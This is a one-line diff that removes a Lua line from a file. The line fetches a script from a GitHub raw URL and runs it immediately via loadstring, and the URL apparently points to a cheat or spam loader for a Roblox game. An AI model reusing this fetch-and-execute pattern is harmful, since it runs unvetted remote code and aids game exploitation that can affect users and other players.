@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/tha-bronx-3-spam2-v2ztnj4hmco5wd.lua"))()
